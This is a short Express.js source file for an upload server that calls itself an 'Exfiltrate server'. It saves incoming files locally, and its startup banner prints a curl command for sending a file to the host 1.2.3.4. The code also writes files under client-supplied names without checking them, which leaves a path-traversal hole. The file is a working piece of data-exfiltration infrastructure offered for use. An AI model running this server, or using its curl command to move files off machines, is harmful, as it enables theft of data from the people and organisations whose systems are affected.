var express = require('express'),
    uuid = require('node-uuid'),
    fs = require('fs');

var app = module.exports = express.createServer();

try {
    fs.mkdirSync(__dirname + "/files");
} catch (e) {
}
// Configuration
app.configure(function(){
  app.use(express.bodyParser());
});

app.post('/', function (req, res) {
    if (!req.files.data.name || req.files.data.name === '-') {
        req.files.data.name = uuid();
    }

    console.log("File uploaded: " + req.files.data.name);

    fs.rename(req.files.data.path, __dirname + "/files/" + req.files.data.name, 
function (err) {
        res.send('', 204);
    });
});

app.listen(3000, '0.0.0.0', function(){
    console.log("Exfiltrate server listening on 0.0.0.0:%d in %s mode", app.address().port, app.settings.env);
    console.log("Send files like this:");
    console.log('curl -F "data=@/path/to/filename" http://1.2.3.4:%d', app.address().port);
});
